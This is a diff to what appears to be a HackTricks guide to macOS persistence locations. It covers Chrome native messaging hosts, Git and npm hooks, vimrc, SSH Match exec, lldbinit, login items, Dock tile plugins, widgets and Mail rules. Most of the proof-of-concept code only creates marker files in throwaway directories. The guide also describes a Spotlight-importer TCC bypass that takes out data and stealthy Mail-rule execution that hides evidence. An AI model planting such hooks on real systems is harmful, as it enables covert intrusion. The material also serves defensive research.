+- **Write target:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` for the current user, or `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` for all users (admin write needed). Chromium and Chrome for Testing use different directories; see [Chrome's current path table](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
+- **Trigger:** An installed Chrome extension with the `nativeMessaging` permission calls `chrome.runtime.connectNative()` or `chrome.runtime.sendNativeMessage()` using the manifest's exact host name. Chrome then starts the host executable. Opening Chrome alone does not execute an arbitrary new native host; creating a manifest without a calling extension does nothing. [Chrome's native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) documents this handshake.
+- **Execution identity:** The Chrome user's account. The manifest must name an absolute executable path and explicitly allow the calling extension origin.
+
+In a disposable browser account with a test extension, the following pair of files demonstrates the write-to-execution link. The manifest's filename must match its `name`, and `TEST_EXTENSION_ID` must be replaced by that extension's actual ID:
+
+```json
+{
+  "name": "org.hacktricks.marker",
+  "description": "Native messaging marker test",
+  "path": "/absolute/path/to/ht-native-host.sh",
+  "type": "stdio",
+  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
+}
+```
+
+Save this JSON as `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. The marker-only executable at the manifest's `path` can contain:
+
+```sh
+#!/bin/sh
+/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
+exit 0
+```
+
+After the test extension calls `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` from its service worker or extension page, the marker proves the host started. This minimal host does not implement Chrome's length-prefixed response protocol, so the extension may report a messaging error after the marker is written. Remove the test manifest, host, and marker to clean up. On macOS 26.5.2 the Chrome app and both manifest directories were present; **the active Chrome profile was not modified or exercised**.
+
+### Karabiner-Elements key-event commands
+
+- **Write target:** `~/.config/karabiner/karabiner.json` in an account where Karabiner-Elements is installed and running. [Karabiner's file-location guide](https://karabiner-elements.pqrs.org/docs/json/location/) says the app watches and reloads this file after a write. JSON files in `assets/complex_modifications` are only importable presets; merely writing one there does not enable a rule.
+- **Trigger:** The configured key event after the rule is active. The [`to.shell_command` reference](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) documents command execution. This is not code execution on login or on every file write.
+- **Execution identity:** The signed-in user running Karabiner's user process. Its own permission grants and any TCC access are app and version dependent.
+
+For a disposable test account, add this rule object to the selected profile's `complex_modifications.rules` array in `karabiner.json`, preserving the rest of that profile. Press F18 to create a harmless marker, then remove this rule and the marker. Choosing F18 avoids replacing an ordinary typing key:
+
+```json
+{
+  "description": "Write a marker on F18",
+  "manipulators": [
+    {
+      "type": "basic",
+      "from": { "key_code": "f18" },
+      "to": [
+        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
+      ]
+    }
+  ]
+}
+```
+
+Karabiner-Elements was not installed in `/Applications` on the macOS 26.5.2 test machine, so this is a documentation-backed PoC rather than a local runtime result.
+
+### Git hooks in a local repository
+
+- **Write target:** An executable hook such as `<repo>/.git/hooks/post-checkout`. If `core.hooksPath` has already been set, use that configured directory instead. A hook committed as an ordinary tracked source file is not automatically installed into a clone.
+- **Trigger:** The corresponding Git operation. For example, `post-checkout` runs after `git checkout` or `git switch`, and can also run after a clone or worktree creation. [Git's hook reference](https://git-scm.com/docs/githooks) lists the events and executable-bit requirement; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) changes the lookup directory.
+- **Execution identity:** The account running Git. The hook can execute only if the repository's effective hooks directory is writable to the actor and the user later performs the relevant Git operation.
+
+This marker-only PoC creates an entirely disposable repository, installs one hook, and switches a branch. It was executed successfully with Apple Git 2.50.1 on macOS 26.5.2:
+
+```bash
+lab=$(mktemp -d)
+git -C "$lab" init -q
+git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
+  commit --allow-empty -qm baseline
+cat > "$lab/.git/hooks/post-checkout" <<EOF
+#!/bin/sh
+/usr/bin/touch "$lab/ran"
+EOF
+chmod 700 "$lab/.git/hooks/post-checkout"
+git -C "$lab" checkout -qb probe
+test -e "$lab/ran" && echo 'post-checkout fired'
+rm -r "$lab"
+```
+
+### npm lifecycle scripts in a project
+
+- **Write target:** The `scripts` map in a writable project's `package.json`, or an installed dependency package whose lifecycle script the user will run. This is a development workflow hook, not execution from opening a directory.
+- **Trigger and identity:** A later `npm install` or `npm ci` with lifecycle scripts allowed runs `preinstall`, `install`, and `postinstall` as the user invoking npm. An ordinary `npm run <name>` also runs matching `pre<name>` and `post<name>` scripts. [npm's lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) lists the events; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) can suppress install lifecycle scripts. Version and policy settings may change what is allowed, so check the target npm version.
+
+This marker-only PoC was run with local npm in a disposable, empty directory. It does not download dependencies or change a user's project:
+
+```bash
+lab=$(mktemp -d)
+cat > "$lab/package.json" <<'EOF'
+{"name":"ht-autostart-marker","version":"1.0.0","private":true,
+ "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
+EOF
+(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
+test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
+rm -r "$lab"
+```
+
+This is distinct from Python interpreter startup files: npm must perform the relevant install or run action, while Python `site` code can load on an ordinary interpreter invocation. Generic `Makefile` targets and build task definitions similarly require the user or an already configured tool to invoke that target; they are not separate OS auto-start paths.
+
+### Vim startup configuration
+
+- **Write target:** `~/.vimrc` for the user who will launch Vim (or another startup file selected by Vim's initialization order). [Vim's startup reference](https://vimhelp.org/starting.txt.html) documents the file and the `VIMINIT`/`EXINIT` overrides.
+- **Trigger:** A subsequent ordinary Vim start that loads this configuration. Vim's `-u NONE` bypasses the user vimrc. This is editor-specific execution, not an OS login trigger.
+- **Execution identity:** The Vim user's account.
+
+The following isolated PoC was run against macOS's `/usr/bin/vim`; it writes no real Vim preferences or open documents:
+
+```bash
+lab=$(mktemp -d)
+printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
+env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
+test -e "$lab/marker" && echo 'vimrc fired'
+rm -r "$lab"
+```
+
+Neovim has a separate user configuration path, `$XDG_CONFIG_HOME/nvim/init.lua` or `init.vim`, and also loads scripts in its `plugin/` runtime directories according to its [startup documentation](https://neovim.io/doc/user/starting/). Neovim was not installed on the macOS 26.5.2 test machine, so this variant was not run there.
+
+### SSH client configuration commands
+
+- **Write target:** `~/.ssh/config`, or another file it already includes. This is a **client** configuration file; it is separate from the server-side `~/.ssh/rc` described below.
+- **Trigger:** A matching `ssh` invocation. `Match exec` runs a local command while the client evaluates its configuration, even for `ssh -G`, which prints configuration without connecting. `ProxyCommand` runs when the client sets up a matching connection. `LocalCommand` runs only after a successful connection and requires `PermitLocalCommand yes` (the default is `no`). These have different timing and prerequisites; a write alone does not execute them. See the upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
+- **Execution identity:** The local user running `ssh`. A matching host, an applicable configuration file, and any required connection are necessary. `ssh -F` can select a different configuration file.
+
+This marker-only PoC was run with Apple's SSH client on macOS 26.5.2. `-G` exercises `Match exec` without making a network connection or reading the user's real SSH configuration:
+
+```bash
+lab=$(mktemp -d)
+cat > "$lab/config" <<EOF
+Match host example.invalid exec "/usr/bin/touch $lab/marker"
+    User nobody
+EOF
+ssh -G -F "$lab/config" example.invalid >/dev/null
+test -e "$lab/marker" && echo 'Match exec fired'
+rm -r "$lab"
+```
+
+### Debugger initialization files
+
+- **Write target:** `~/.lldbinit` or the higher-priority application-specific file such as `~/.lldbinit-lldb`. LLDB reads one at debugger startup. A current-directory `.lldbinit` is **not** executed by default; the user must enable `target.load-cwd-lldbinit` or pass `--local-lldbinit`. See the [LLDB manual](https://lldb.llvm.org/man/lldb.html).
+- **Trigger and identity:** The user starts LLDB without `--no-lldbinit`; commands run as that user. Merely opening a project does not imply the project's `.lldbinit` runs.
+
+The following marker-only test ran against LLDB on macOS 26.5.2, with an isolated home and working directory:
+
+```bash
+lab=$(mktemp -d)
+printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
+(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
+test -e "$lab/marker" && echo 'lldbinit fired'
+rm -r "$lab"
+```
+
+For **GDB**, the [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) lists `$HOME/Library/Preferences/gdb/gdbinit` and then `~/.gdbinit` on macOS. A current-directory `.gdbinit` is subject to the [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), and `-nx`/`-nh` suppress initialization files. GDB was not installed on the test Mac, so this variant was not run locally.
 
 ### SSHRC
 
@@ -664,17 +942,26 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.g
 
 #### Locations
 
-- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-  - **Trigger:** Login
-  - Exploit payload stored calling **`osascript`**
-- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
-  - **Trigger:** Login
-  - Root required
+- **Registered login-item helper app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (common bundled location).
+  - **Trigger:** Registration may start the helper immediately; it then starts on later user logins, subject to approval.
+- **Registered bundled agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` or `Contents/Library/LaunchDaemons/<name>.plist`.
+  - **Trigger:** An approved agent may start on registration and at later logins; an approved daemon starts at boot. A daemon requires admin approval.
 
 #### Description
 
-In System Preferences -> Users & Groups -> **Login Items** you can find **items to be executed when the user logs in**.\
-It it's possible to list them, add and remove from the command line:<sup>[[15]](#references)</sup>
+In **System Settings → General → Login Items & Extensions**, users can review login and background items. macOS 13 and later provide [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) to register bundled login items, launch agents, and launch daemons. Its [`register()` behavior](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) differs by type and approval state. **Writing a helper into an app bundle is not sufficient to register a new login item.** Conversely, if an already registered helper executable is writable, changing that executable can affect its next launch without a new registration; verify the actual path and code-signing checks first.
+
+The following is a read-only way to look for bundled helpers on a Mac; it neither registers nor launches any of them:
+
+```bash
+find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
+  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
+  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
+```
+
+For a bundled launch plist, resolve `BundleProgram` **relative to the app bundle root** (for example `Contents/MacOS/Helper`), as [Apple's Service Management migration guidance](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) specifies. A read-only `/Applications` inventory on the research Mac found 14 bundled helper entries and five `BundleProgram` declarations; all five targets resolved, and two passed a user-writability check. That check does **not** establish that either helper is registered, enabled, executable after signature validation, or reachable by a sandbox. `sfltool dumpbtm` listed 150 named records on this Mac; it is an inspection aid, not a test that every record is running.
+
+Older login items can also be managed through Apple events. It is possible to list, add, and remove them from the command line, although adding them changes the user's persistent login configuration and may require Automation approval:<sup>[[15]](#references)</sup>
 
 ```bash
 #List all items:
@@ -687,9 +974,7 @@ osascript -e 'tell application "System Events" to make login item at end with pr
 osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
 
-These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-
-**Login items** can **also** be indicated in using the API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) which will store the configuration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
+`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` is an implementation detail, not a supported place to install a payload by simply writing a file. The older `SMLoginItemSetEnabled` API is superseded for new helpers by `SMAppService`; the page's former `/var/db/com.apple.xpc.launchd/loginitems.501.plist` path was absent on the macOS 26.5.2 test machine. Use the registration API and system UI state when assessing modern login items, not an assumed database path.
 
 ### ZIP as Login Item
 
@@ -715,7 +1000,14 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.g
 
 `at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.<sup>[[16]](#references)</sup>
 
-By **default** they are **disabled** but the **root** user can **enable** **them** with:
+The bundled `com.apple.atrun.plist` has `Disabled = true`, but launchd keeps effective enabled/disabled overrides separately. On the macOS 26.5.2 test machine, `launchctl print-disabled system` reported `com.apple.atrun` as **enabled** despite that bundled key. Check effective state before claiming that `at` jobs will run:
+
+```bash
+launchctl print-disabled system | grep 'com.apple.atrun'
+launchctl print system/com.apple.atrun
+```
+
+An administrator can enable a disabled `atrun` service with `launchctl`; the following historical example changes system service state and was **not** run on the research Mac:
 
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
@@ -789,6 +1081,29 @@ The filename contains the queue, the job number, and the time it’s scheduled t
 - `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Tuesday 7:46:00`.
 
 If we print the job file, we find that it contains the same information we got using `at -c`.
+
+### Calendar open-file alerts
+
+- **Write target:** An executable app bundle or another file **already selected** by a Calendar event's custom **Open file** alert. Creating or editing the alert itself requires access to that calendar event through Calendar or an accepted calendar data source; a random file write does not create an alert.
+- **Trigger:** The alert's scheduled time on a Mac where Calendar processes the event. A recurring event can repeat the action. [Apple's current Calendar guide](https://support.apple.com/guide/calendar/icl1012/mac) confirms the **Custom → Open file** alert option on macOS 26.
+- **Execution identity and gates:** Calendar opens the chosen file for the signed-in user through its associated application. Launching an app bundle may execute its code as that user, subject to Gatekeeper, quarantine, and other macOS checks. A plain script file may merely open in an editor; its extension alone does not prove code execution.
+
+To assess a candidate safely, inspect the event's alert in Calendar and the selected file's permissions. This path was documented from Apple's guide and **not** run on the research Mac because testing it would modify a live calendar and wait for a desktop event. A test in a disposable account can select a marker-only app bundle, set a near-future Open file alert, confirm launch, and delete the event and app afterward.
+
+### Shortcuts automations on macOS
+
+- **Write target:** An executable file **already referenced** by a shortcut's action, or an existing shortcut that an authorized user can edit. A random `.shortcut` file or a write to an undocumented Shortcuts database is not a supported automation registration method.
+- **Trigger and identity:** A previously configured, enabled automation event, such as time of day or an app event, invokes the shortcut for the signed-in user. [Apple's current Mac automation guide](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) lists supported events, explains when an automation can run without asking, and describes removing a trigger. [Apple's Shortcuts privacy guide](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) requires **Allow Running Scripts** for script actions, and individual actions can still request permissions.
+
+This is a conditional write-to-execution path **only when the existing action loads a writable target**. Creating a new automation through the UI changes live settings and was not attempted on the research Mac. In a disposable account, an owner can configure a time-of-day shortcut whose script touches `/tmp/ht-shortcuts-marker`, enable the necessary permissions, confirm the marker after the event, then delete the automation, shortcut, and marker.
+
+### Automator actions and Quick Actions
+
+- **Write targets:** `~/Library/Automator/*.action` (user) and `/Library/Automator/*.action` (administrator) for action bundles. A saved Quick Action workflow is commonly kept in `~/Library/Services/*.workflow`; check the actual workflow path selected by the user. [Apple's Automator framework reference](https://developer.apple.com/documentation/automator) lists the action search directories.
+- **Trigger:** Automator loads available action bundles when it runs, but an action's task runs when a workflow that uses it executes. A Quick Action runs when the user selects it from Finder, Services, or another exposed menu. A Folder Action workflow runs when items are added to its **already attached** folder, and a Calendar Alarm workflow runs at its event time. [Apple's workflow types](https://support.apple.com/guide/automator/aut7cac58839/mac) distinguish these events. Merely writing an action or workflow does not attach a folder or schedule a calendar event.
+- **Execution identity and gates:** The account running the workflow; Automator or the invoking app must load the action and any current code-signing or privacy checks must allow it. A writable action bundle already referenced by an active workflow is a different case from installing a new action and waiting for selection.
+
+The user `Automator` and `Services` directories were present on the macOS 26.5.2 test Mac; `/Library/Automator` was absent. No live workflow was created, attached, or executed. Use a disposable account and a marker-only action/workflow to confirm a particular load path. The separate [Folder Actions](#folder-actions) section covers that event source in more detail.
 
 ### Folder Actions
 
@@ -983,6 +1298,14 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 killall Dock
 ```
 
+### Input Methods
+
+- **Write target:** A code-bearing input-method app bundle installed in `~/Library/Input Methods/` (user) or `/Library/Input Methods/` (administrator). This differs from Apple's plain-text `.inputplugin` keyboard-mapping files, which are not an arbitrary-code payload by themselves.
+- **Trigger:** The user adds/enables the input source in **System Settings → Keyboard → Text Input** and then selects or uses it. A bundle merely copied into the directory is not proof that macOS will launch it. [Apple's current Input Sources guide](https://support.apple.com/guide/mac-help/mchl84525d76/mac) describes enabling and switching sources; [Apple's InputMethodKit documentation](https://developer.apple.com/documentation/inputmethodkit) covers code-bearing input methods.
+- **Execution identity and gates:** The method runs for the signed-in user, subject to input-method registration, code-signing, and current macOS security checks. Existing enabled methods with a writable executable need a separate path and signature review.
+
+Apple's [older third-party input-method note](https://developer.apple.com/library/archive/qa/qa1810/_index.html) already warned that copying certain palette methods into these directories does not even make them appear in Input Sources. On the macOS 26.5.2 research Mac, the user directory exists, but no bundle was installed or activated, so this is a documented conditional path rather than a local runtime result.
+
 ### Color Pickers
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>
@@ -1006,6 +1329,8 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.gi
 
 Then, when the color picker is triggered, your bundle should execute as well.
 
+This is conditional on a compatible app opening the system color panel and selecting the installed picker. [Apple's color-panel guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) describes the legacy bundle locations. A local path check found the legacy color-picker XPC service, but no picker was installed or loaded on the research Mac; do not infer a TCC bypass from the path alone.
+
 Note that the binary loading your library has a **very restrictive sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 ```bash
@@ -1023,7 +1348,7 @@ Note that the binary loading your library has a **very restrictive sandbox**: `/
 **Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>
 
 - Useful to bypass sandbox: **No, because you need to execute your own app**
-- TCC bypass: ???
+- TCC bypass: Depends on the enabled extension's sandbox and permissions; no general bypass established.
 
 #### Location
 
@@ -1034,6 +1359,8 @@ Note that the binary loading your library has a **very restrictive sandbox**: `/
 An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).
 
 Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:<sup>[[21]](#references)[[22]](#references)</sup>
+
+An installed extension also needs to be **enabled** and invoked for a relevant Finder location or item; writing an arbitrary `.appex` bundle is insufficient. [Apple's Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) exposes enabled state. The `pluginkit` commands below illustrate explicit registration and enabling, not a file-only auto-start. This route was documentation-reviewed, with no new extension installed or enabled on the research Mac.
 
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
@@ -1178,7 +1505,7 @@ To facilitate this rapid search capability, Spotlight maintains a **proprietary 
 
 The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.
 
-The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.
+The plugins or **`.mdimporter`** bundles are located in the places mentioned previously. A new bundle must be discovered and match a file type, and Spotlight must actually index a matching file; copying a bundle alone does not prove it has loaded. [Apple's MDImporter reference](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) ties loading to an eligible changed file. Spotlight importer execution on macOS 26 was not tested here.
 
 It's possible to **find all the `mdimporters`** loaded running:
 
@@ -1239,6 +1566,9 @@ Then **change** the code of the function **`GetMetadataForFile`** to execute you
 
 Finally, **build and copy your new `.mdimporter`** to one of the three previous locations. You can check whether it is loaded by **monitoring the logs** or running **`mdimport -L`**.
 
+> [!TIP]
+> Even though the importer sandbox is very restrictive, `mdworker` indexes files with **privileged read access**. A malicious `.mdimporter` can therefore read the *content* of files inside TCC-protected locations (Downloads, Pictures, Desktop, …) and exfiltrate harvested metadata without any TCC prompt — the **"Sploitlight" TCC bypass (CVE-2025-31199)**, patched in macOS Sequoia 15.4.<sup>[[55]](#references)</sup>
+
 ### ~~Preference Pane~~
 
 > [!CAUTION]
@@ -1260,12 +1590,386 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.g
 
 It doesn't look like this is working anymore.<sup>[[26]](#references)</sup>
 
+### Application Script Files
+
+Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - But you need the targeted application to be installed and run/used by the victim
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+
+#### Location
+
+An **interpreted script that an installed application or tool actually executes** and that the actor can modify. Confirm the file's permissions and the calling path; finding a `.sh` or `.py` file alone is insufficient. Apple's [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) says signed app bundles seal resources, including scripts. Editing an in-bundle script breaks that seal and may be detected or blocked when the bundle is validated. An external script such as Homebrew's launcher has different signing and trust behavior. Historical examples from the writeup include:
+
+- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – a script used by older Sublime Text releases; the file and its startup use must be checked for the installed version. It was absent on the test Mac.
+- **`/opt/homebrew/bin/brew`** (Apple Silicon) or **`/usr/local/bin/brew`** (Intel) – a Bash launcher executed when that `brew` path is invoked, if installed and writable by the actor. `/opt/homebrew/bin/brew` was a writable Bash script on the test Mac; that is a local observation, not a general Homebrew permission rule.
+- **IDLE's `idlemain.py`** inside a Python app bundle – may require admin permission to write, but runs with the IDLE user's identity.
+- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – a historical root-run shell script when the corresponding `org.wireshark.ChmodBPF` launchd job is installed. The script and job were absent on the test Mac.
+
+#### Description & Exploitation
+
+Some tools and apps execute interpreted scripts at runtime. A writable script can execute added commands when its specific caller next runs, provided signature validation, quarantine, and other checks allow it. The original research demonstrated several 2019 installations; re-check their paths and triggers on the target version.<sup>[[37]](#references)</sup>
+
+```python
+# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
+# copy may fail its normal Homebrew logic; the marker checks script execution.
+import pathlib, subprocess, tempfile
+
+source = pathlib.Path('/opt/homebrew/bin/brew')
+with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
+    target = pathlib.Path(root) / 'brew'
+    marker = pathlib.Path(root) / 'ran'
+    lines = source.read_text().splitlines(keepends=True)
+    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
+    target.chmod(0o700)
+    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
+    print('marker fired:', marker.exists())
+```
+
+This copy test produced `marker fired: True` on macOS 26.5.2; the original launcher was untouched. It proves the insertion point executes in the copy, not that a modified signed app bundle or real Homebrew installation would pass every launch check.
+
+### Dock Tile Plugins
+
+Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - Requires an app declaring the plug-in to be discovered/registered and processed by the Dock
+  - The plugin loads into an **Apple-signed** helper that has no app-sandbox entitlement and has **library validation disabled**. This helper was not shown in the Background Task Management UI in the cited research; visibility on a target release should be checked.
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+
+#### Location
+
+- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenced with the **`NSDockTilePlugIn`** key in the app's `Info.plist`; the plugin's own `Info.plist` sets **`NSPrincipalClass`**.
+
+#### Description & Exploitation
+
+When an app declares `NSDockTilePlugIn`, the Dock can load the referenced bundle into the **`com.apple.dock.external.extra`** XPC helper (`...extra.arm64` on Apple Silicon) at login or when its tile is added; the app itself need not launch. This requires the app to be discovered/registered and accepted by macOS. The helper is **Apple-signed**, has no `com.apple.security.app-sandbox` entitlement, and has `com.apple.security.cs.disable-library-validation`. The principal class' **`setDockTile:`** method is invoked on load; from there it can subscribe to distributed notifications (e.g. `com.apple.screenIsLocked`) for later events.<sup>[[38]](#references)</sup>
+
+On macOS 26.5.2, read-only `codesign` inspection confirmed the helper's Apple signature and entitlements, and several installed apps declared `NSDockTilePlugIn`. No new plug-in was installed or loaded on that Mac, so execution of a newly written bundle on that release remains untested.
+
+```bash
+# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
+for a in /Applications/*.app /System/Applications/*.app; do
+  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
+    && echo "$a -> $v"
+done
+# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
+```
+
+```objc
+// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
+// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
+// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
+@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
+@end
+@implementation MyDockPlugin
+- (void)setDockTile:(NSDockTile *)dockTile {
+    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
+}
+@end
+```
+
+### Widgets (Notification Center / WidgetKit)
+
+Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - The widget extension runs in its **own process**, and adding one does **not** raise a Background Task Management alert
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+  - The config plist lives inside a TCC-protected container, so editing it from outside needs Full Disk Access or a TCC bypass
+
+#### Location
+
+- Widget extension bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
+- Active/registered widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` and `widgets.widgets`)
+
+#### Description & Exploitation
+
+A WidgetKit extension shipped inside an app runs in **its own process** managed by Notification Center. Registering an instance in `widgets.instances` (a base64 `NSKeyedArchiver`-encoded `CHSWidget` blob with embedded `INIntent` data) and restarting NotificationCenter makes the widget load and execute its `TimelineProvider`/intent code.<sup>[[39]](#references)</sup>
+
+```bash
+# Inspect currently-registered widgets (file present on stock macOS)
+plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
+  | grep -iE "widgets?\." | head
+```
+
+### Mail.app Rules (Run AppleScript)
+
+Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - But Mail.app must be configured with an account and running; the trigger is an inbound email
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+  - Editing the rules/scripts from outside Mail may require Mail to be closed and Full Disk Access on modern macOS
+
+#### Location
+
+- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (local rules; `V10` on Sonoma/Sequoia, `V11`+ on newer)
+- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-synced rules, take precedence)
+- Rule enablement: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**
+
+#### Description & Exploitation
+
+An Apple Mail **rule** can have a *"Run AppleScript"* action. By adding a rule that matches a crafted **subject line** and runs an attacker script, the adversary gets **remotely-triggerable, stealthy** code execution in Mail's context whenever the magic email arrives — a vector that evades many persistence scanners because no LaunchAgent/Login Item is created.<sup>[[42]](#references)</sup> Setting the rule to also **delete** the trigger email hides the evidence. Defenders can hunt for it directly:<sup>[[43]](#references)</sup>
+
+```bash
+# Enumerate Mail rules that invoke AppleScript
+grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
+plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
+```
+
+### Configuration Profiles (.mobileconfig)
+
